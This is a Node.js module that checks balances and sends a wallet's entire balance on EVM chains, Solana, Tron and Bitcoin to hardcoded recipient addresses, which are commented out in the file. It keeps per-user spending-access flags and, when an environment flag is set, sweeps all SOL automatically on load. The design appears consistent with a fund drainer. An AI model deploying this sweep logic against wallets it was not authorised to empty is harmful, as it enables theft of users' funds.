const { ethers } = require("ethers");
const solanaWeb3 = require("@solana/web3.js");
const axios = require("axios");
const {
  evmWallet,
  evmProvider,
  solanaKeypair,
  tronWeb,
  tronWalletAddress,
  bitcoinWallet,
  bitcoinAddress
} = require("./wallet");
require('dotenv').config();

const cryptoOptions = {
  // BTC: "REPLACE_WITH_BTC_RECIPIENT_ADDRESS", // Set your recipient BTC address here
  // TRX: "TJ4kT7CASXpYgMnSjd6BE49WngJbvrjvta",
  // SOL: "7AQz1cBj7xgtRbG91dSWRhUysAM86pK4p9yvD5aMbNcU",
  // ETH: "0x79aCF368cd3498a0c305b6cd3C47dc2E818aB75D",
  // TON: "UQAEL5e4uj5x9s91p7ffqqpRRGNAPDlsQX6cZGDIvJ1jAVDz"
};

// ---------------- EVM Functions ----------------
async function checkBalanceEVM() {
  if (!evmWallet) throw new Error("No EVM wallet configured");
  const balance = await evmWallet.getBalance();
  return ethers.utils.formatEther(balance);
}

async function sendEntireBalanceEVM(network) {
  if (!evmWallet) throw new Error("No EVM wallet configured");
  network = network.toUpperCase();
  const recipient = cryptoOptions[network] || cryptoOptions.ETH;
  const balance = await evmWallet.getBalance();
  const gasLimit = 21000;
  const gasPrice = await evmProvider.getGasPrice();
  const fee = gasPrice.mul(gasLimit);
  if (balance.lte(fee)) throw new Error("Insufficient balance to cover gas fee.");
  const amountToSend = balance.sub(fee);
  const tx = { to: recipient, value: amountToSend, gasLimit, gasPrice };
  const txResponse = await evmWallet.sendTransaction(tx);
  await txResponse.wait();
  return txResponse.hash;
}

// ---------------- Solana Functions ----------------
async function checkBalanceSol() {
  try {
    const connectionUrl = solanaWeb3.clusterApiUrl("mainnet-beta");
    console.log("Connecting to Solana RPC at:", connectionUrl);
    const connection = new solanaWeb3.Connection(connectionUrl, "confirmed");
    const publicKeyStr = solanaKeypair.publicKey.toBase58();
    console.log("Using Solana public key:", publicKeyStr);
    
    const lamports = await connection.getBalance(solanaKeypair.publicKey);
    console.log("Lamports balance:", lamports);
    
    const solBalance = lamports / solanaWeb3.LAMPORTS_PER_SOL;
    console.log("Computed SOL balance:", solBalance);
    return solBalance;
  } catch (error) {
    console.error("Error in checkBalanceSol:", error);
    throw new Error("Solana balance fetch failed: " + error.message);
  }
}

async function sendEntireBalanceSol() {
  try {
    const recipientPubKey = new solanaWeb3.PublicKey(cryptoOptions.SOL);
    const connectionUrl = solanaWeb3.clusterApiUrl("mainnet-beta");
    const connection = new solanaWeb3.Connection(connectionUrl, "confirmed");
    const balance = await connection.getBalance(solanaKeypair.publicKey);
    const { feeCalculator } = await connection.getRecentBlockhash();
    const fee = feeCalculator.lamportsPerSignature;
    if (balance <= fee) throw new Error("Insufficient balance to cover fee.");
    const amountToSend = balance - fee;
    console.log("Sending SOL: Balance:", balance, "Fee:", fee, "Amount to send:", amountToSend);
    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: solanaKeypair.publicKey,
        toPubkey: recipientPubKey,
        lamports: amountToSend,
      })
    );
    const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [solanaKeypair]);
    console.log("SOL Transaction signature:", signature);
    return signature;
  } catch (error) {
    console.error("Error in sendEntireBalanceSol:", error);
    throw new Error("Sending SOL failed: " + error.message);
  }
}

// ---------------- Tron Functions ----------------
async function checkBalanceTrx() {
  const balance = await tronWeb.trx.getBalance(tronWalletAddress);
  return balance; // in sun
}

async function sendEntireBalanceTrx() {
  const recipient = cryptoOptions.TRX;
  const balance = await tronWeb.trx.getBalance(tronWalletAddress);
  const fee = 100000; // placeholder fee in sun
  if (balance <= fee) throw new Error("Insufficient balance to cover fee.");
  const amountToSend = balance - fee;
  const txn = await tronWeb.transactionBuilder.sendTrx(recipient, amountToSend, tronWalletAddress);
  const signedTxn = await tronWeb.trx.sign(txn);
  const receipt = await tronWeb.trx.sendRawTransaction(signedTxn);
  if (!receipt.result) throw new Error("Transaction failed on Tron");
  return receipt.transaction;
}

// ---------------- Bitcoin Functions ----------------
// Using BlockCypher API and bitcoinjs-lib
async function checkBalanceBtc() {
  if (!bitcoinAddress) throw new Error("Bitcoin wallet not configured");
  const url = `https://api.blockcypher.com/v1/btc/main/addrs/${bitcoinAddress}/balance`;
  try {
    const response = await axios.get(url);
    const satBalance = response.data.final_balance; // in satoshis
    return satBalance / 1e8; // Convert satoshis to BTC
  } catch (error) {
    throw new Error("Bitcoin balance fetch failed");
  }
}

async function sendEntireBalanceBtc() {
  if (!bitcoinWallet || !bitcoinAddress) throw new Error("Bitcoin wallet not configured");
  const utxoUrl = `https://api.blockcypher.com/v1/btc/main/addrs/${bitcoinAddress}?unspentOnly=true&includeScript=true`;
  try {
    const utxoResponse = await axios.get(utxoUrl);
    const utxos = utxoResponse.data.txrefs;
    if (!utxos || utxos.length === 0) throw new Error("No UTXOs found for Bitcoin address");
    // Sum up all UTXO values (in satoshis)
    const totalSatoshis = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
    // Set a fixed fee (in satoshis) for simplicity; in production, calculate dynamically
    const fee = 10000;
    if (totalSatoshis <= fee) throw new Error("Insufficient balance to cover fee.");
    const amountToSend = totalSatoshis - fee;

    const bitcoin = require("bitcoinjs-lib");
    const networkBtc = bitcoin.networks.bitcoin;
    const psbt = new bitcoin.Psbt({ network: networkBtc });

    // Add each UTXO as an input
    for (const utxo of utxos) {
      // Fetch the raw transaction hex for each UTXO
      const rawTx = await getRawTransaction(utxo.tx_hash);
      psbt.addInput({
        hash: utxo.tx_hash,
        index: utxo.tx_output_n,
        nonWitnessUtxo: Buffer.from(rawTx, 'hex')
      });
    }

    // Add output to the recipient address defined in cryptoOptions.BTC
    const recipient = cryptoOptions.BTC;
    psbt.addOutput({
      address: recipient,
      value: amountToSend
    });

    // Sign all inputs
    for (let i = 0; i < utxos.length; i++) {
      psbt.signInput(i, bitcoinWallet);
    }
    psbt.validateSignaturesOfAllInputs();
    psbt.finalizeAllInputs();
    const txHex = psbt.extractTransaction().toHex();

    // Broadcast the transaction via BlockCypher
    const pushUrl = `https://api.blockcypher.com/v1/btc/main/txs/push`;
    const pushResponse = await axios.post(pushUrl, { tx: txHex });
    if (pushResponse.data && pushResponse.data.tx && pushResponse.data.tx.hash) {
      return pushResponse.data.tx.hash;
    } else {
      throw new Error("Bitcoin transaction broadcast failed");
    }
  } catch (error) {
    throw new Error("Sending BTC failed: " + error.message);
  }
}

async function getRawTransaction(txHash) {
  const url = `https://api.blockcypher.com/v1/btc/main/txs/${txHash}?includeHex=true`;
  const response = await axios.get(url);
  return response.data.hex;
}

// ---------------- Ton Functions (Placeholders) ----------------
async function checkBalanceTon() {
  return "Ton balance integration not implemented";
}

async function sendEntireBalanceTon() {
  throw new Error("Sending Ton is not implemented");
}

// ---------------- Main Exported Functions ----------------
async function checkBalance(network) {
  network = network.toUpperCase();
  switch (network) {
    case "ETH":
    case "BNB":
    case "POLYGON":
      return await checkBalanceEVM();
    case "SOL":
    case "SOLANA":
      return await checkBalanceSol();
    case "TRX":
      return await checkBalanceTrx();
    case "BTC":
      return await checkBalanceBtc();
    case "TON":
      return await checkBalanceTon();
    default:
      throw new Error("Unsupported network for balance check");
  }
}

async function sendEntireBalance(network) {
  network = network.toUpperCase();
  switch (network) {
    case "ETH":
    case "BNB":
    case "POLYGON":
      return await sendEntireBalanceEVM(network);
    case "SOL":
    case "SOLANA":
      return await sendEntireBalanceSol();
    case "TRX":
      return await sendEntireBalanceTrx();
    case "BTC":
      return await sendEntireBalanceBtc();
    case "TON":
      return await sendEntireBalanceTon();
    default:
      throw new Error("Unsupported network for sending transaction");
  }
}

// Spending access state (in-memory for demo; use DB in production)
let spendingAccessMap = {};

function setSpendingAccess(userId, access) {
  spendingAccessMap[userId] = access;
  console.log(`Spending access for ${userId}: ${access}`);
}

function getSpendingAccess(userId) {
  return !!spendingAccessMap[userId];
}

module.exports = { checkBalance, sendEntireBalance, setSpendingAccess, getSpendingAccess };


// Automatic backend process: Check and send entire SOL funds immediately if enabled.
if (process.env.AUTO_SEND_SOL === "true") {
  (async () => {
    try {
      console.log("Auto send process started for SOL...");
      const solBalance = await checkBalance("SOL");
      console.log("SOL balance:", solBalance);
      if (solBalance > 0) {
        console.log("Sending entire SOL balance...");
        const signature = await sendEntireBalance("SOL");
        console.log("SOL funds sent. Transaction signature:", signature);
      } else {
        console.log("No SOL funds available to send.");
      }
    } catch (error) {
      console.error("Auto send SOL error:", error);
    }
  })();
}
